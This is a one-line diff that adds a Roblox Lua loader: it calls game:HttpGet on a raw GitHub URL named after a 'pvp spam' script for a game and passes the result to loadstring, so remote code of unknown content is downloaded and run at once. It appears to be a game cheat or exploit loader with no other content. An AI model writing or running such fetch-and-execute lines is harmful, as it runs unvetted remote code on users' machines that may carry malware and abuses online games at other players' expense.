@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/rofront-world-pvp-spam7-s605ff69mcbesj.lua"))()
